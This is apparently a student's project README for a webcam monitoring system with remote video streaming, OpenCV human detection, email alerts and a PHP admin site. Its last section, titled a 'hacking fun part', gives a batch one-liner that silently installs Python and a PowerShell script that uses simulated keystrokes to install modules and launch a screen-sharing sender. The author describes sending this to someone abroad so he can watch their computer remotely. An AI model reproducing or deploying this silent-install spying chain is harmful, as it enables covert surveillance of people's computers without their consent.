#SecureLink
=-=-=-=-=-=-=-=-=-= ?WHAT IS THIS PROJECT? =-=-=-=-=-=-=-=-=-=

This project was made during the Web & Mobile Developmente course, but focuses more on the cybersecurity side.

Basically what I managed to develop, was a remote video transmission connection to another computer. I also integrated human body motion detection, which starts recording when it recognizes a human body or face, takes a screenshot and sends a notification to the email, along with the url link of the private cloud where all the recordings are stored.

I was really hyped about this project, although i don't have raspberry pi... so I had to use my 10 years old TOSHIBA laptop, that eventually died during the process...luckily for me, I had practically finished the project.

For the interface of this project I built a website, which has a database of users, registration, authentication, administration that allows to create permissions, edit other users and delete them (simple CRUD).

For this project I used the following technologies:

  - Python 
  - Php
  - HTML & CSS
  - Bootstrap
  - PowerShell
  - Command Prompt
  - SQL
  - XAMPP
=-=-=-=-=-=-=-=-=-= PART I - REMOTE CONNECTION BETWEEN COMPUTERS =-=-=-=-=-=-=-=-=-=

Well, the logic behind this idea, consists of the possibility, first of all, to be able to connect to the other computer and transmit the image in real time. For this I used the Python module called "vidstream".

Official documentation: https://pypi.org/project/vidstream/

Very simple to use actually. But to make this work properly so that it is not limited only to the local network connection we also need to make some settings in the router. Each router is different, but on mine it was necessary to access the INTERNET>PORT MAPPING settings.

Port Mapping: Allows remote devices to connect to a specific device on a private LAN.

Next we just need to mention that all IP's that will access from outside will be directly redirected to my computer's IP.

Success! At this point we can put our remote computer (the one that will transmit video) anywhere in the world, connected to any network, it will always transmit the image in real time, as soon as it is connected.

To be able to reverse the process, i.e., leave the computer at home and access it from another network to see what is happening at home from the webcam, we will have to purchase an internet sharing "hotspot", or a router/switch, not linked to any telecommunication operator company, to redirect the IP's received, for example, to a specific network outside LAN, as our IP could be used once we are connected to the mobile data internet.

=-=-=-=-=-=-=-=-=-= PART II - HUMAN BODY/FACE DETECTION and more =-=-=-=-=-=-=-=-=-=

With the connection part done, we move on to the next topic, which is motion detection and sending notification to the email.

In this case I used another Python module, called "openCV".

Link to the official documentation: https://pypi.org/project/opencv-python/

The thing is that there are lots of possibilities to work with this framework. I chose to use the possibility to capture the face and the human body. As soon as the camera identifies a human, it starts recording in MP4 format and saves the file with the name in the following format: "DAY/MONTH/YYYY-HOURS/MINUTES/ SECONDS", using Python's "datetime" package.

So, a human appears, the camera starts recording, if there is no more detection of a body or face, after 5 seconds the recording ends. Since this process is done with "while True:", it is an infinite loop, i.e. the process can be repeated over and over again without having to restart the program.

I also implemented a notification as soon as the camera detects a human movement, when the recording starts, a screenshot is taken, which goes as an attachment along with the message in the email. A link is also passed in the body of the email, which will have all the captured videos on the cloud (I used OneDrive). So as soon as the video recording stops, the video is immediately sent to the cloud. For this I used an automation with Command Prompt.

=-=-=-=-=-=-=-=-=-= PART III - THE CONNECTION BRIDGE =-=-=-=-=-=-=-=-=-=

The connection is made with the help of " WEB CRAWLER/ SPIDER ". So, I made a page on my site that contains a

, when the "TURN ON" button is pressed to start the real-time transmission, the variable inside the camera's database changes to "2 ", when the "TURN OFF" button is pressed, it changes to "1".
The remote computer will always be listening to this page in an infinite loop. When the variable is "2", it starts sharing in real time, when it is "1", just give the command: "taskkill /im python.exe <nul /F" from the command line on the computer side that wants to see what is happening on the remote computer camera.

=-=-=-=-=-=-=-=-=-= PART III - HACKING FUN PART =-=-=-=-=-=-=-=-=-=

FOLDER: AUTO INSTALL - PYTHON - REMOTE PC SCRIPTS

I also created a script in Command Prompt and PowerShell, in which with only 2 clicks on a .bat file, Python is installed on the computer, without the interface:

	python-3.10.7-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 & start /B start cmd.exe @cmd /c powershell E:\2.ps1
Then it autonomously imports the necessary modules with .ps1 script (PowerShell executable):

	# Activating the Windows Key
	Add-Type -AssemblyName System.Windows.Forms
	[System.Windows.Forms.SendKeys]::SendWait('^{ESC}')

	Add-Type -AssemblyName System.Windows.Forms    
	timeout 2
	'cmd'.ToCharArray() | ForEach-Object {[System.Windows.Forms.SendKeys]::SendWait($_)}

	$wshell = New-Object -ComObject wscript.shell

	$wshell.SendKeys("{ENTER}")

	timeout 2
	$wshell.SendKeys("pip install opencv-python & pip install pyautogui & pip install bs4 & pip install vidstream & pip install requests pip install Pillow --upgrade & python E:\sender.py")

	$wshell.SendKeys("{ENTER}")
and then, the "sender.py" will share the screen in real-time to any desired IP in the world.

In other words, I can be in Portugal, and when I send this script to a person in another country, like Switzerland for example, and when executed, a request is sent to my router that I have at home and it forwards it to my computer ip, this way I can see everything remotely what is happening on the other remote computer.

=-=-=-=-=-=-=-=-=-= \o/ END \o/ =-=-=-=-=-=-=-=-=-=
